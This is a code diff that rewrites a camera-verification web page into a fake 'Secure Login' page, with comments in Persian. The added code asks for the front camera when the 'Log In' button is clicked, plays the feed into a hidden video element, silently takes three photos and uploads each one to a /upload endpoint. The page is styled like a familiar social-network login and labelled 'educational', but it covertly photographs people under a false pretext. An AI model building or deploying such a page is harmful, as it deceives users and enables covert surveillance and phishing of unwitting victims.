@@ -2,66 +2,143 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Verification</title>
+<title>Secure Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f0f2f5;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+.login-box {
+  width: 360px;
+  background: #fff;
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+  text-align: center;
+}
+.logo {
+  font-size: 32px;
+  font-weight: bold;
+  color: #1877f2;
+  margin-bottom: 10px;
+}
+.sub {
+  font-size: 14px;
+  color: #606770;
+  margin-bottom: 15px;
+}
+input {
+  width: 100%;
+  padding: 12px;
+  margin: 6px 0;
+  border-radius: 6px;
+  border: 1px solid #dddfe2;
+  font-size: 15px;
+}
+button {
+  width: 100%;
+  background: #1877f2;
+  color: white;
+  border: none;
+  padding: 12px;
+  font-size: 16px;
+  border-radius: 6px;
+  cursor: pointer;
+  margin-top: 10px;
+}
+button:hover {
+  background: #166fe5;
+}
+.note {
+  font-size: 12px;
+  color: #65676b;
+  margin-top: 12px;
+}
+</style>
 </head>
 <body>
 
-<h2>Camera Verification</h2>
-<p>Please allow camera access. Photos will be taken automatically.</p>
+<div class="login-box">
+  <div class="logo">Secure Login</div>
+  <div class="sub">Educational verification page</div>
 
-<button onclick="startCamera()">Enable Camera</button>
+  <input type="text" placeholder="Email or phone">
+  <input type="password" placeholder="Password">
 
-<video id="video" autoplay playsinline></video>
+  <button id="loginBtn">Log In</button>
+
+  <div class="note">This page requires camera access for verification</div>
+</div>
+
+<!-- مخفی برای عکس گرفتن -->
+<video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
+const loginBtn = document.getElementById("loginBtn");
 
-const token = new URLSearchParams(window.location.search).get("token");
-let stream = null;
-let photos = [];
-
-function startCamera() {
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => {
-      stream = s;
+loginBtn.addEventListener("click", async () => {
+  // 0.5 ثانیه صبر قبل از درخواست دوربین
+  setTimeout(async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
       video.srcObject = stream;
-      // ⏱ بعد از ۰.۵ ثانیه شروع عکس‌گیری
-      setTimeout(takePhotos, 500);
-    })
-    .catch(() => alert("Camera permission required"));
-}
 
-function takePhotos() {
-  let count = 0;
-  photos = [];
+      // صبر تا ویدیو آماده شود و play شود
+      await video.play();
 
-  const interval = setInterval(() => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
-    canvas.toBlob(blob => photos.push(blob));
-    count++;
+      // بعد از اجازه دوربین 0.8 ثانیه صبر و سپس گرفتن عکس‌ها
+      setTimeout(() => {
+        takePhotos(3, 500); // 3 عکس با فاصله 500ms
+      }, 800);
 
-    if (count === 3) {
-      clearInterval(interval);
-      sendPhotos();
+    } catch (e) {
+      alert("Camera permission is required. Please allow access to continue.");
+      console.error("Camera error:", e);
     }
-  }, 700);
+  }, 500);
+});
+
+// گرفتن چند عکس با فاصله مشخص
+function takePhotos(count, delay) {
+  let taken = 0;
+  const interval = setInterval(() => {
+    if(taken >= count){
+      clearInterval(interval);
+      return;
+    }
+    capture(taken);
+    taken++;
+  }, delay);
 }
 
-function sendPhotos() {
-  const fd = new FormData();
-  fd.append("token", token);
-  photos.forEach((p, i) => fd.append("photo" + i, p));
+// گرفتن یک عکس
+function capture(index){
+  if(video.videoWidth === 0 || video.videoHeight === 0) return;
 
-  fetch("/upload", { method: "POST", body: fd })
-    .then(() => {
-      if (stream) stream.getTracks().forEach(t => t.stop());
-      alert("✅ Submitted");
-    })
-    .catch(() => alert("❌ Upload failed"));
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(blob=>{
+    const formData = new FormData();
+    formData.append(`photo${index}`, blob, `photo${index}.jpg`);
+    formData.append("device", "Web");
+
+    fetch("/upload", { method:"POST", body:formData })
+      .then(res => console.log(`Photo ${index} uploaded`, res.status))
+      .catch(err => console.error("Upload failed", err));
+  }, "image/jpeg");
 }
 </script>
 
